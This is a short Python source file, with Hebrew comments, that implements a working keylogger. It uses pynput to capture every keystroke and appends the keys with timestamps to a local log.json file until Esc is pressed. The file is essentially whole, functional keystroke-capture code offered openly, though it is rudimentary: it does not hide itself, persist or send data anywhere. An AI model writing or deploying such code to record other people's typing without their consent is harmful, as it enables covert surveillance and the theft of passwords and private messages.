import json
from datetime import datetime
from pynput import keyboard


class KeyLogger:
    def __init__(self, file="log.json"):
        self.file, self.keys = file, []

    def on_press(self, key):
        if key == keyboard.Key.esc:
            self.save()
            return False
        self.keys.append(getattr(key, 'char', str(key)))

    def save(self):
        try:
            with open(self.file, "r", encoding="utf-8") as f:
                data = json.load(f)
                if not isinstance(data, list):  # אם הנתונים לא רשימה, נתחיל רשימה חדשה
                    data = []
        except (FileNotFoundError, json.JSONDecodeError):
            data = []  # יצירת רשימה חדשה במקרה של קובץ לא קיים או נתונים פגומים

        data.append({"time": datetime.now().strftime("%H:%M:%S"), "keys": self.keys})

        with open(self.file, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

        # איפוס self.keys אחרי כל שמירה
        self.keys = []

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    KeyLogger().start()
